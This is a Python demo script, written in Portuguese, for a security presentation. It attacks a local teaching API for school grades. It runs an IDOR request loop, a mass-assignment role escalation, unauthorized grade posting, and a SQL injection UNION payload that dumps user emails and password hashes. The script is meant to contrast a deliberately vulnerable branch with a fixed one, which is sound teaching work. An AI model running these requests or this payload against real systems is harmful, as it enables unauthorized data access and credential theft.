"""Demonstracao ao vivo dos ataques contra a NotasAPI (Passo 4 da apresentacao).

Uso (com a API rodando em http://127.0.0.1:8000, SOMENTE no ambiente de teste local):
    python scripts/demo_ataques.py

Na branch `vulneravel` os ataques funcionam; na `main` todos sao bloqueados.
Usa apenas a biblioteca padrao do Python.
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

API = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"


def chamar(metodo, rota, corpo=None, token=None):
    dados = json.dumps(corpo).encode() if corpo is not None else None
    req = urllib.request.Request(API + rota, data=dados, method=metodo)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req) as resp:  # nosec B310 - URL controlada (ambiente local de teste)
            return resp.status, json.loads(resp.read() or "null")
    except urllib.error.HTTPError as erro:
        try:
            return erro.code, json.loads(erro.read() or "null")
        except json.JSONDecodeError:
            return erro.code, None


def titulo(texto):
    print("\n" + "=" * 70 + f"\n{texto}\n" + "=" * 70)


def resultado(vulneravel, msg_falha, msg_ok):
    print(("  >>> VULNERAVEL: " + msg_falha) if vulneravel else ("  >>> PROTEGIDO: " + msg_ok))


def main():
    status, resp = chamar("POST", "/auth/login", {"email": "ana@escola.br", "senha": "AnaAluna@2026"})
    if status != 200:
        sys.exit(f"Nao foi possivel fazer login como Ana ({status}). A API esta rodando em {API}?")
    token_ana = resp["access_token"]
    _, minhas = chamar("GET", "/notas/minhas", token=token_ana)
    ids_da_ana = {n["id"] for n in minhas}
    print(f"Logada como Ana (ALUNO). Notas da Ana: {minhas}")

    titulo("ATAQUE 1 - IDOR/BOLA: Ana troca o id na URL para ler notas de outros alunos")
    vazadas = []
    for nota_id in range(1, 6):
        status, nota = chamar("GET", f"/notas/{nota_id}", token=token_ana)
        print(f"  GET /notas/{nota_id} -> HTTP {status} {nota}")
        if status == 200 and nota_id not in ids_da_ana:
            vazadas.append(nota)
    resultado(bool(vazadas), f"Ana leu {len(vazadas)} nota(s) que nao sao dela!",
              "a API so devolve as notas da propria Ana (404 nas demais).")

    titulo("ATAQUE 2 - Mass assignment: Ana envia \"papel\": \"PROFESSOR\" no PATCH /usuarios/me")
    status, resp = chamar("PATCH", "/usuarios/me", {"papel": "PROFESSOR"}, token=token_ana)
    print(f"  PATCH /usuarios/me -> HTTP {status} {resp}")
    promovida = status == 200 and resp.get("papel") == "PROFESSOR"
    resultado(promovida, "Ana agora e PROFESSORA no banco de dados!",
              "campo \"papel\" recusado (HTTP 422).")
    if promovida:
        _, novo = chamar("POST", "/auth/login", {"email": "ana@escola.br", "senha": "AnaAluna@2026"})
        token_ana = novo["access_token"]

    titulo("ATAQUE 3 - Aluna lancando nota para si mesma (POST /notas)")
    ana_id = minhas[0]["aluno_id"] if minhas else 2
    status, resp = chamar("POST", "/notas", {"aluno_id": ana_id, "disciplina": "Fisica", "valor": 10}, token=token_ana)
    print(f"  POST /notas -> HTTP {status} {resp}")
    resultado(status == 201, "Ana lancou um 10 em Fisica para si mesma!", "somente professor lanca nota (HTTP 403).")

    titulo("ATAQUE 4 - Injecao de SQL na busca de alunos (GET /alunos?nome=)")
    payload = "x' UNION SELECT email, senha_hash FROM usuarios --"
    status, resp = chamar("GET", "/alunos?nome=" + urllib.parse.quote(payload), token=token_ana)
    print(f"  nome = {payload}\n  -> HTTP {status}")
    for linha in resp or []:
        print(f"     {linha}")
    vazou = status == 200 and any("@" in str(linha) for linha in resp or [])
    resultado(vazou, "e-mails e hashes de senha de TODOS os usuarios vazaram!",
              "o texto e tratado como dado, nao como SQL (lista vazia).")


if __name__ == "__main__":
    main()
